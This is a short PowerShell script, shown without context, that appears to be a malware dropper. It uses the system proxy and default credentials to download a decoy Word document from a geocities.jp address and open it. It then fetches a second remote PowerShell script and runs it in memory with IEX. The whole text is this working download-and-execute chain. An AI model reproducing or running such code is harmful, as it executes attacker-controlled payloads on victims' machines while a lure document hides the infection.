
$n=new-object net.webclient;
$n.proxy=[Net.WebRequest]::GetSystemWebProxy();
$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$n.DownloadFile("http://www.geocities.jp/lgxpoy6/zaavar.docx","$env:temp\zaavar.docx");
Start-Process "$env:temp\zaavar.docx"
IEX $n.downloadstring('http://www.geocities.jp/frgrjxq1/f0921.ps1');

